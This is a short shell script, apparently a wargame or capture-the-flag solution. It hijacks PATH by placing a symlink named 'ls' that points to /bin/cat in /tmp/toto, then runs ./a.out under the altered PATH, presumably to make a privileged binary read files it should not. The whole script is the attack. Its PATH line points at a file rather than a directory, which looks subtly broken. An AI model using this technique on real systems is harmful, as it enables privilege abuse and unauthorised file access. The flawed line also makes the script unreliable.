#!/bin/sh

mkdir /tmp/toto/
ln -sf /bin/cat /tmp/toto/ls
PATH=/tmp/toto/ls ./a.out


